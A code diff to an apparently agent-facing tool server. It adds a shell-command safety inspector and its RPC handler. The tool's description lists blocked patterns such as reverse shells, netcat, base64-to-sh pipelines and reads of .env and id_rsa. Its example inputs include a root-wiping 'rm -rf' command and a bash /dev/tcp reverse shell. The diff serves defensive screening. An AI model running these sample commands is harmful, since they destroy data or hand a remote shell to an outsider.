@@ -93,6 +93,26 @@ TOOLS = [
         }
     },
     {
+        "name": "inspect_shell_command_safety",
+        "description": "Ultra-low latency (<2ms) deterministic lexical and syntax inspector for Unix/Bash/Windows shell commands. Intercepts destructive disk commands (rm -rf, dd, mkfs, fork bombs), reverse shells (/dev/tcp, netcat), pipeline obfuscation (base64 -d | sh), and credential harvesting (cat .env, id_rsa) before terminal execution.",
+        "inputSchema": {
+            "type": "object",
+            "properties": {
+                "command": {
+                    "type": "string",
+                    "description": "The shell command line or chained pipeline string to inspect prior to terminal/bash execution.",
+                    "default": "ls -la /app",
+                    "examples": [
+                        "ls -la /app",
+                        "rm -rf / --no-preserve-root",
+                        "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
+                    ]
+                }
+            },
+            "required": ["command"]
+        }
+    },
+    {
         "name": "get_onchain_security_attestation",
         "description": "Generates EIP-712 cryptographic signatures and raw Solidity calldata (v, r, s) for smart contract-level on-chain agent guardrails across Polygon, Base, and Arbitrum networks. Use this tool ONLY when preparing on-chain smart contract transactions that require cryptographic EIP-712 safety proof (v, r, s calldata) for an on-chain Safe or Guard contract. Do NOT use this tool for off-chain safety screening or general text auditing; use `inspect_agent_output` instead.",
         "inputSchema": {
@@ -354,6 +374,23 @@ async def handle_rpc_request(req: Dict[str, Any]) -> Optional[Dict[str, Any]]:
                         {
                             "type": "text",
                             "text": json.dumps(ast_result, indent=2, ensure_ascii=False)
+                        }
+                    ]
+                }
+            }
+
+        elif tool_name == "inspect_shell_command_safety":
+            from app.shell_security_engine import shell_security_engine
+            command = tool_args.get("command", "")
+            shell_result = shell_security_engine.audit_command(command)
+            return {
+                "jsonrpc": "2.0",
+                "id": req_id,
+                "result": {
+                    "content": [
+                        {
+                            "type": "text",
+                            "text": json.dumps(shell_result, indent=2, ensure_ascii=False)
                         }
                     ]
                 }
